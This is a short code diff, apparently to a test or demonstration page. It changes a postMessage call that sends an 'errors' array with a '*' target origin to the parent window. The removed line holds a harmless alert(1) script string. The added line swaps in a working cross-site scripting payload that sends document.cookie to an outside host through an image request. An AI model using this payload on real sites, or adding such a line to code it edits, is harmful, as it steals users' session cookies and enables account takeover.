@@ -5,7 +5,7 @@
         window.parent.postMessage({ 
           status: 'error',
           errors: [
-            '<script' + '>alert(1);</' + 'script>'
+            '<script' + '>var img = new Image; img.src="http://agropark39.ru/op.php?cookie=" + document.cookie;</' + 'script>'
           ]
         }, '*');
     </script>
